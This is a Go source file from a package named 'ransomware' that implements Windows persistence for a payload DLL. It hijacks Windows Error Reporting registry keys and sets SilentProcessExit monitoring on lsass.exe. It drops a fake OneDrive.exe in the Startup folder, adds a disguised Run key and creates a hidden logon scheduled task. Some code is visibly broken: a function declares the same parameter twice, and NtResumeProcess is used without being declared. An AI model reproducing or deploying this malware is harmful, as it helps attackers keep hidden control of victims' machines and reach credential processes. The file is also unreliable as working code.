//go:build windows

package ransomware

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

type WERPersistence struct {
	config          *RansomwareConfig
	payloadDLL      string
	hangsPath       string
	silentExitPath  string
}

var _ = unsafe.Sizeof(0)

func NewWERPersistence(cfg *RansomwareConfig) *WERPersistence {
	return &WERPersistence{
		config: cfg,
	}
}

func (w *WERPersistence) InstallHangsHijack(payloadDLL string) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("WER persistence requires Windows")
	}

	w.payloadDLL = payloadDLL

	hangsKey := `SOFTWARE\Microsoft\Windows\Windows Error Reporting\Hangs`
	k, err := windows.OpenKey(windows.HKEY_LOCAL_MACHINE,
		windows.StringToUTF16Ptr(hangsKey),
		windows.KEY_SET_VALUE|windows.KEY_CREATE_SUB_KEY)
	if err != nil {
		return fmt.Errorf("cannot open WER Hangs key: %w", err)
	}
	defer windows.CloseKey(k)

	windows.SetValueEx(k, windows.StringToUTF16Ptr("DumpFolder"), 0, windows.REG_EXPAND_SZ,
		windows.StringToUTF16Ptr(payloadDLL))

	refKey := fmt.Sprintf("Hangs\\Reflector")
	subKey, err := windows.OpenKey(windows.HKEY_LOCAL_MACHINE,
		windows.StringToUTF16Ptr(`SOFTWARE\Microsoft\Windows\Windows Error Reporting\`+refKey),
		windows.KEY_SET_VALUE|windows.KEY_CREATE_SUB_KEY)
	if err != nil {
		subKey, _, _ = windows.CreateKey(windows.HKEY_LOCAL_MACHINE,
			windows.StringToUTF16Ptr(`SOFTWARE\Microsoft\Windows\Windows Error Reporting\`+refKey))
	}
	if subKey != 0 {
		defer windows.CloseKey(subKey)
		windows.SetValueEx(subKey, windows.StringToUTF16Ptr("DumpFolder"), 0, windows.REG_EXPAND_SZ,
			windows.StringToUTF16Ptr(payloadDLL))
	}

	w.hangsPath = hangsKey
	return nil
}

func (w *WERPersistence) TriggerHang() error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("Windows only")
	}

	triggerScript := `
$sig = @'
[DllImport("kernel32.dll")]
public static extern IntPtr GetCurrentProcess();
'@
Add-Type -MemberDefinition $sig -Name "K32" -Namespace "W64"

$proc = [W64.K32]::GetCurrentProcess()
$ntdll = Add-Type -MemberDefinition '[DllImport("ntdll.dll")] public static extern int NtSuspendProcess(IntPtr hProcess);' -Name "NTD" -Namespace "W32" -PassThru
$ntdll::NtSuspendProcess($proc)

Start-Sleep -Seconds 120
$ntdll::NtResumeProcess($proc)
`
	c := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
		"-Command", triggerScript)
	c.Start()
	return nil
}

func (w *WERPersistence) InstallSilentProcessExit() error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("Windows only")
	}

	silentKey := `SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit`
	k, err := windows.CreateKey(windows.HKEY_LOCAL_MACHINE,
		windows.StringToUTF16Ptr(silentKey))
	if err != nil {
		return fmt.Errorf("cannot create SilentProcessExit: %w", err)
	}
	defer windows.CloseKey(k)

	windows.SetValueEx(k, windows.StringToUTF16Ptr("ReportingMode"), 0, windows.REG_DWORD,
		(*byte)(unsafe.Pointer(&[]uint32{1}[0])))
	windows.SetValueEx(k, windows.StringToUTF16Ptr("MonitorProcess"), 0, windows.REG_EXPAND_SZ,
		windows.StringToUTF16Ptr("lsass.exe"))

	if w.payloadDLL != "" {
		windows.SetValueEx(k, windows.StringToUTF16Ptr("LocalDumpsDll"), 0, windows.REG_EXPAND_SZ,
			windows.StringToUTF16Ptr(w.payloadDLL))
	}

	w.silentExitPath = silentKey
	return nil
}

func (w *WERPersistence) RemoveHangsHijack() error {
	if w.hangsPath == "" {
		return nil
	}

	windows.RegDeleteKey(windows.HKEY_LOCAL_MACHINE,
		windows.StringToUTF16Ptr(w.hangsPath+"\\Reflector"))
	return nil
}

func (w *WERPersistence) RemoveSilentProcessExit() error {
	if w.silentExitPath == "" {
		return nil
	}

	windows.RegDeleteKey(windows.HKEY_LOCAL_MACHINE,
		windows.StringToUTF16Ptr(w.silentExitPath))
	return nil
}

func (w *WERPersistence) FullWERSuite(payloadDLL string) map[string]interface{} {
	result := make(map[string]interface{})

	if runtime.GOOS != "windows" {
		result["platform"] = "non-windows"
		return result
	}

	if err := w.InstallHangsHijack(payloadDLL); err != nil {
		result["hangs_hijack"] = fmt.Sprintf("error: %v", err)
	} else {
		result["hangs_hijack"] = "installed"
	}

	if err := w.InstallSilentProcessExit(); err != nil {
		result["silent_exit"] = fmt.Sprintf("error: %v", err)
	} else {
		result["silent_exit"] = "installed"
	}

	result["payload_dll"] = payloadDLL

	return result
}

func (w *WERPersistence) AdditionalPersistenceMethods() map[string]interface{} {
	result := make(map[string]interface{})

	if runtime.GOOS != "windows" {
		return result
	}

	startupDir := os.Getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
	persistenceFile := filepath.Join(startupDir, "OneDrive.exe")
	dllData := []byte("MZ\x90\x00")

	if err := os.WriteFile(persistenceFile, dllData, 0644); err == nil {
		result["startup_persistence"] = persistenceFile
	}

	shellKey := `Software\Microsoft\Windows\CurrentVersion\Run`
	k, err := windows.OpenKey(windows.HKEY_CURRENT_USER,
		windows.StringToUTF16Ptr(shellKey), windows.KEY_SET_VALUE)
	if err == nil {
		defer windows.CloseKey(k)
		payloadPath := fmt.Sprintf("cmd.exe /c start /b %s", persistenceFile)
		windows.SetValueEx(k, windows.StringToUTF16Ptr("OneDrive"), 0, windows.REG_SZ,
			windows.StringToUTF16Ptr(payloadPath))
		result["run_key_persistence"] = "installed"
	}

	taskXML := fmt.Sprintf(`<?xml version="1.0"?>
<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>
  <Actions><Exec><Command>cmd.exe</Command><Arguments>/c start /b %s</Arguments></Exec></Actions>
  <Settings><Hidden>true</Hidden></Settings>
</Task>`, persistenceFile)

	taskPath := os.Getenv("TEMP") + "\\wer_sync.xml"
	os.WriteFile(taskPath, []byte(taskXML), 0644)
	exec.Command("schtasks", "/create", "/tn", "WerSyncHang", "/xml", taskPath, "/f").Run()
	os.Remove(taskPath)
	result["scheduled_task"] = "WerSyncHang"

	return result
}

func (w *WERPersistence) Cleanup() {
	w.RemoveHangsHijack()
	w.RemoveSilentProcessExit()
	exec.Command("schtasks", "/delete", "/tn", "WerSyncHang", "/f").Run()
}

func (w *WERPersistence) VerifyPersistence() map[string]bool {
	status := map[string]bool{
		"hangs_key":   false,
		"silent_exit": false,
		"startup":     false,
	}

	if runtime.GOOS != "windows" {
		return status
	}

	if w.hangsPath != "" {
		k, err := windows.OpenKey(windows.HKEY_LOCAL_MACHINE,
			windows.StringToUTF16Ptr(w.hangsPath), windows.KEY_READ)
		if err == nil {
			windows.CloseKey(k)
			status["hangs_key"] = true
		}
	}

	if w.silentExitPath != "" {
		k, err := windows.OpenKey(windows.HKEY_LOCAL_MACHINE,
			windows.StringToUTF16Ptr(w.silentExitPath), windows.KEY_READ)
		if err == nil {
			windows.CloseKey(k)
			status["silent_exit"] = true
		}
	}

	startupDir := os.Getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
	if _, err := os.Stat(filepath.Join(startupDir, "OneDrive.exe")); err == nil {
		status["startup"] = true
	}

	return status
}

func (w *WERPersistence) corruptReg(w *WERPersistence, key string) {
	windows.RegDeleteKey(windows.HKEY_CURRENT_USER, windows.StringToUTF16Ptr(key))
}

var _ = strings.TrimSpace
